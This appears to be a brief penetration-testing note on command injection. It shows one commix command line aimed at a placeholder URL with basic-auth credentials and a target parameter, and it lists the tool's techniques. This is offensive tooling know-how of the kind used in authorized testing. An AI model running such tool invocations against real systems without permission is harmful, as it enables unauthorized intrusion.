# command injection

## commix
Automates command injection - works like sqlmap.
```
python2 commix.py --url="http://<url>:<port>/" --auth-type=basic --auth-cred='<user>:<pass>!' --data='search=xxxxctl02=' -p search --technique='f'
```
Possible values for techiques are 'classic','eval-based', 'time-based' or 'file-based'.

tags: command injection commix